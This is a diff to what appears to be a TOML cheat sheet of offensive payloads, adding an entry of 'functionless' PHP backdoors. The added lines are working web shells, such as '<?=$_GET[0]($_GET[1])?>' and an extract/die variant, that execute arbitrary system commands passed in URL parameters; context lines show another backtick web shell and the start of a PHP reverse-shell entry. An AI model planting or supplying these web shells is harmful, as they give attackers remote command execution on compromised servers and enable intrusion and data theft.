@@ -23,6 +23,16 @@ command = """#Run commands with example.com/backdoor.php?0=whoami
 <?=`$_GET[0]`?>"""
 
 [[data]]
+description = "'Functionless' PHP backdoors:"
+language = "php"
+command = """#Run commands with example.com/backdoor.php?0=system&1=whoami
+<?=$_GET[0]($_GET[1])?>
+
+#Run commands with example.com/backdoor.php?f=system&c=whoami
+<?=@extract($_REQUEST);@die($f($c))?>"""
+
+
+[[data]]
 description = "YAPS (the most complete PHP reverse shell)"
 language = "bash"
 command = """#Upload it to the target machine
